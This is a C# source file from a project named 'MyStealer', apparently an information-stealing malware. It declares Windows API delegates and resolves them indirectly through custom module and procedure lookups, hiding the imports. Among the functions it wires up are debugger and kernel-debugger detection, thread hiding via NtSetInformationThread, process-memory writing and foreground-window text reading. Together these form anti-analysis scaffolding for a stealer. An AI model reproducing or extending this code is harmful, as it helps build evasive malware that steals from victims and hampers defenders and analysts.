using System.Runtime.InteropServices;
using System;
using System.Text;

namespace MyStealer.AntiDebug
{
    internal static partial class NativeCalls
    {
        #region Delegates

        // kernel32

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate bool DSetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate IntPtr DCreateMutexA(IntPtr lpMutexAttributes, bool bInitialOwner, string lpName);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate bool DIsDebuggerPresent();

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate bool DCheckRemoteDebuggerPresent(IntPtr Handle, ref bool CheckBool);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate bool DWriteProcessMemory(SafeHandle ProcHandle, IntPtr BaseAddress, byte[] Buffer, uint size, int NumOfBytes);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate IntPtr DOpenThread(uint DesiredAccess, bool InheritHandle, int ThreadId);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate uint DGetTickCount();

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate void DOutputDebugStringA(string Text);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate IntPtr DGetCurrentThread();

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate bool DGetThreadContext(IntPtr hThread, ref CONTEXT Context);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate int DQueryFullProcessImageNameA(SafeHandle hProcess, uint Flags, byte[] lpExeName, int[] lpdwSize);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate bool DIsProcessCritical(IntPtr Handle, ref bool BoolToCheck);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate IntPtr DGetModuleHandleA(string name);

        // user32

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate IntPtr DGetForegroundWindow();

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate int DGetWindowTextLengthA(IntPtr HWND);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate int DGetWindowTextA(IntPtr HWND, StringBuilder WindowText, int nMaxCount);

        // ntdll

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate bool DNtClose(IntPtr Handle);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate uint DNtSetInformationThread(IntPtr ThreadHandle, uint ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate uint DNtQueryInformationProcess_uint(SafeHandle hProcess, uint ProcessInfoClass, out uint ProcessInfo, uint nSize, uint ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate uint DNtQueryInformationProcess_IntPtr(SafeHandle hProcess, uint ProcessInfoClass, out IntPtr ProcessInfo, uint nSize, uint ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate uint DNtQueryInformationProcess_ProcessBasicInfo(SafeHandle hProcess, uint ProcessInfoClass, ref PROCESS_BASIC_INFORMATION ProcessInfo, uint nSize, uint ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate uint DNtQuerySystemInformation_CodeIntegrityInfo(uint SystemInformationClass, ref SYSTEM_CODEINTEGRITY_INFORMATION SystemInformation, uint SystemInformationLength, out uint ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate uint DNtQuerySystemInformation_KernelDebuggerInfo(uint SystemInformationClass, ref SYSTEM_KERNEL_DEBUGGER_INFORMATION SystemInformation, uint SystemInformationLength, out uint ReturnLength);

        #endregion

        #region Variable declarations

        // kernel32

        internal static DSetHandleInformation SetHandleInformation { get; private set; }

        internal static DCreateMutexA CreateMutexA { get; private set; }

        internal static DIsDebuggerPresent IsDebuggerPresent { get; private set; }

        internal static DCheckRemoteDebuggerPresent CheckRemoteDebuggerPresent { get; private set; }

        internal static DWriteProcessMemory WriteProcessMemory { get; private set; }

        internal static DOpenThread OpenThread { get; private set; }

        internal static DGetTickCount GetTickCount { get; private set; }

        internal static DOutputDebugStringA OutputDebugStringA { get; private set; }

        internal static DGetCurrentThread GetCurrentThread { get; private set; }

        internal static DGetThreadContext GetThreadContext { get; private set; }

        internal static DQueryFullProcessImageNameA QueryFullProcessImageNameA { get; private set; }

        internal static DIsProcessCritical IsProcessCritical { get; private set; }

        internal static DGetModuleHandleA GetModuleHandleA { get; private set; }

        // user32

        internal static DGetForegroundWindow GetForegroundWindow { get; private set; }

        internal static DGetWindowTextLengthA GetWindowTextLengthA { get; private set; }

        internal static DGetWindowTextA GetWindowTextA { get; private set; }

        // ntdll

        internal static DNtClose NtClose { get; private set; }

        internal static DNtSetInformationThread NtSetInformationThread { get; private set; }

        internal static DNtQueryInformationProcess_uint NtQueryInformationProcess_uint { get; private set; }

        internal static DNtQueryInformationProcess_IntPtr NtQueryInformationProcess_IntPtr { get; private set; }

        internal static DNtQueryInformationProcess_ProcessBasicInfo NtQueryInformationProcess_ProcessBasicInfo { get; private set; }

        internal static DNtQuerySystemInformation_CodeIntegrityInfo NtQuerySystemInformation_CodeIntegrityInfo { get; private set; }

        internal static DNtQuerySystemInformation_KernelDebuggerInfo NtQuerySystemInformation_KernelDebuggerInfo { get; private set; }

        #endregion

        private static void InitIndirectCalls()
        {
            // kernel32
            var kernel32 = MyGetModuleHandle("kernel32.dll");

            SetHandleInformation = Marshal.GetDelegateForFunctionPointer<DSetHandleInformation>(MyGetProcAddress(kernel32, "SetHandleInformation"));
            CreateMutexA = Marshal.GetDelegateForFunctionPointer<DCreateMutexA>(MyGetProcAddress(kernel32, "CreateMutexA"));
            IsDebuggerPresent = Marshal.GetDelegateForFunctionPointer<DIsDebuggerPresent>(MyGetProcAddress(kernel32, "IsDebuggerPresent"));
            CheckRemoteDebuggerPresent = Marshal.GetDelegateForFunctionPointer<DCheckRemoteDebuggerPresent>(MyGetProcAddress(kernel32, "CheckRemoteDebuggerPresent"));
            WriteProcessMemory = Marshal.GetDelegateForFunctionPointer<DWriteProcessMemory>(MyGetProcAddress(kernel32, "WriteProcessMemory"));
            OpenThread = Marshal.GetDelegateForFunctionPointer<DOpenThread>(MyGetProcAddress(kernel32, "OpenThread"));
            GetTickCount = Marshal.GetDelegateForFunctionPointer<DGetTickCount>(MyGetProcAddress(kernel32, "GetTickCount"));
            OutputDebugStringA = Marshal.GetDelegateForFunctionPointer<DOutputDebugStringA>(MyGetProcAddress(kernel32, "OutputDebugStringA"));
            GetCurrentThread = Marshal.GetDelegateForFunctionPointer<DGetCurrentThread>(MyGetProcAddress(kernel32, "GetCurrentThread"));
            GetThreadContext = Marshal.GetDelegateForFunctionPointer<DGetThreadContext>(MyGetProcAddress(kernel32, "GetThreadContext"));
            QueryFullProcessImageNameA = Marshal.GetDelegateForFunctionPointer<DQueryFullProcessImageNameA>(MyGetProcAddress(kernel32, "QueryFullProcessImageNameA"));
            IsProcessCritical = Marshal.GetDelegateForFunctionPointer<DIsProcessCritical>(MyGetProcAddress(kernel32, "IsProcessCritical"));
            GetModuleHandleA = Marshal.GetDelegateForFunctionPointer<DGetModuleHandleA>(MyGetProcAddress(kernel32, "GetModuleHandleA"));

            // user32
            var user32 = LoadLibrary("user32.dll"); // user32 is not loaded by default

            GetForegroundWindow = Marshal.GetDelegateForFunctionPointer<DGetForegroundWindow>(MyGetProcAddress(user32, "GetForegroundWindow"));
            GetWindowTextLengthA = Marshal.GetDelegateForFunctionPointer<DGetWindowTextLengthA>(MyGetProcAddress(user32, "GetWindowTextLengthA"));
            GetWindowTextA = Marshal.GetDelegateForFunctionPointer<DGetWindowTextA>(MyGetProcAddress(user32, "GetWindowTextA"));

            // ntdll
            var ntdll = MyGetModuleHandle("ntdll.dll");

            NtClose = Marshal.GetDelegateForFunctionPointer<DNtClose>(MyGetProcAddress(ntdll, "NtClose"));
            NtSetInformationThread = Marshal.GetDelegateForFunctionPointer<DNtSetInformationThread>(MyGetProcAddress(ntdll, "NtSetInformationThread"));
            NtQueryInformationProcess_uint = Marshal.GetDelegateForFunctionPointer<DNtQueryInformationProcess_uint>(MyGetProcAddress(ntdll, "NtQueryInformationProcess"));
            NtQueryInformationProcess_IntPtr = Marshal.GetDelegateForFunctionPointer<DNtQueryInformationProcess_IntPtr>(MyGetProcAddress(ntdll, "NtQueryInformationProcess"));
            NtQueryInformationProcess_ProcessBasicInfo = Marshal.GetDelegateForFunctionPointer<DNtQueryInformationProcess_ProcessBasicInfo>(MyGetProcAddress(ntdll, "NtQueryInformationProcess"));
            NtQuerySystemInformation_CodeIntegrityInfo = Marshal.GetDelegateForFunctionPointer<DNtQuerySystemInformation_CodeIntegrityInfo>(MyGetProcAddress(ntdll, "NtQuerySystemInformation"));
            NtQuerySystemInformation_KernelDebuggerInfo = Marshal.GetDelegateForFunctionPointer<DNtQuerySystemInformation_KernelDebuggerInfo>(MyGetProcAddress(ntdll, "NtQuerySystemInformation"));
        }
    }
}
